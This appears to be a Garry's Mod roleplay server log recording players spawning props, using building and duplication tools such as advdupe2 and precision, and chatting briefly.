+[18:32:42] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:32:43] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:32:45] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:33:12] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:33:17] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube6x6x05.mdl
+[18:33:20] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:33:26] DrDerpenstein<STEAM_0:0:13562763> spawned sent pvault_moneybag
+[18:33:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent pvault_moneybag
+[18:33:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent pvault_moneybag
+[18:33:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent pvault_moneybag
+[18:33:38] Thomasツ<STEAM_0:0:121940340> used the tool material on models/hunter/blocks/cube4x4x025.mdl
+[18:33:42] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube4x4x025.mdl
+[18:33:48] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:33:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:33:59] Derp: if u can get like 2-4 hours of playtime and apply on the forums ill make u a mod
+[18:34:13] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube4x4x025.mdl
+[18:34:14] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube4x4x025.mdl
+[18:34:18] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:34:18] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:34:29] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube4x4x025.mdl
+[18:34:29] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:34:37] Thomasツ<STEAM_0:0:121940340> used the tool colour on models/hunter/blocks/cube4x4x025.mdl
+[18:34:49] Thomasツ<STEAM_0:0:121940340> used the tool material on models/hunter/blocks/cube4x4x025.mdl
+[18:34:52] Thomasツ<STEAM_0:0:121940340> used the tool material on models/hunter/blocks/cube4x4x025.mdl
+[18:34:55] DrDerpenstein<STEAM_0:0:13562763> used the tool remover on *260
+[18:34:56] Thomasツ<STEAM_0:0:121940340> used the tool remover on models/hunter/blocks/cube4x4x025.mdl
+[18:34:56] DrDerpenstein<STEAM_0:0:13562763> used the tool remover on *261
+[18:35:01] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube4x4x025.mdl
+[18:35:01] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:35:02] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube4x4x025.mdl
+[18:35:02] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:35:04] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube4x4x025.mdl
+[18:35:04] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:35:05] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube4x4x025.mdl
+[18:35:05] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:35:06] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube4x4x025.mdl
+[18:35:06] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube4x4x025.mdl
+[18:35:15] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x6x025.mdl
+[18:35:17] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x3x025.mdl
+[18:35:18] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x4x025.mdl
+[18:35:31] Thomasツ<STEAM_0:0:121940340> used the tool material on models/hunter/blocks/cube2x4x025.mdl
+[18:35:39] Thomasツ<STEAM_0:0:121940340> used the tool colour on models/hunter/blocks/cube2x4x025.mdl
+[18:35:44] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube2x4x025.mdl
+[18:35:49] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube4x4x025.mdl
+[18:35:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x4x025.mdl
+[18:36:11] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube2x4x025.mdl
+[18:36:11] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x4x025.mdl
+[18:36:14] Thomasツ<STEAM_0:0:121940340> used the tool stacker_improved on models/hunter/blocks/cube2x4x025.mdl
+[18:36:14] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x4x025.mdl
+[18:36:22] Thomasツ<STEAM_0:0:121940340> used the tool remover on models/hunter/blocks/cube2x4x025.mdl
+[18:36:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube150x150x025.mdl
+[18:36:30] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x3x025.mdl
+[18:36:40] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x3x025.mdl
+[18:36:55] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube2x3x025.mdl
+[18:37:00] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on models/hunter/blocks/cube2x4x025.mdl
+[18:37:00] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube2x3x025.mdl
+[18:37:04] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:04] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:06] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:06] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:06] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:06] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:07] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:07] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:09] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:09] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:10] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:10] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:10] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:10] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:10] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:11] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:11] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:12] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:15] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:20] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:20] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:20] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:22] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:23] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:26] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:26] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:27] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:29] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:37:30] Thomasツ<STEAM_0:0:121940340> used the tool precision on models/hunter/blocks/cube2x3x025.mdl
+[18:38:05] Thomasツ: /advert <hsv> Not Today (Counter) </hsv>
+[18:40:17] Client "bert simson" connected.
+[18:42:27] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:27] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x025.mdl
+[18:42:28] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:35] Client "bert simson" spawned in server <STEAM_0:1:179345279> (took 198 seconds).
+[18:43:48] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/misc/stair1x1.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:48] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/misc/stair1x1.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/misc/stair1x1.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
+[18:43:49] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:56] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube025x025x025.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01b.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/mechanics/gears2/pinion_20t2.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube125x125x025.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:45:57] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:46:01] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:46:03] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:46:03] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:46:04] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:46:10] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:46:10] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/gibs/hgibs.mdl
+[18:46:10] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:47:23] bobbicus has a wonderful voice: ?
+[18:47:28] bobbicus has a wonderful voice: ???????????????????
+[18:47:30] bobbicus has a wonderful voice: oh
+[18:47:35] bobbicus has a wonderful voice: hello
+[18:48:00] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:48:00] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/gibs/hgibs.mdl
+[18:48:40] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:48:40] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/gibs/hgibs.mdl
+[18:49:10] bobbicus has a wonderful voice<STEAM_0:1:179345279> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:49:10] bobbicus has a wonderful voice<STEAM_0:1:179345279> spawned model models/gibs/hgibs.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> used the tool advdupe2 on maps/rp_downtown_tits_v2.bsp
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence03a.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence03a.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_building_details/storefront_template001a_bars.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence01a.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube1x2x1.mdl
+[18:49:31] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube075x3x075.mdl
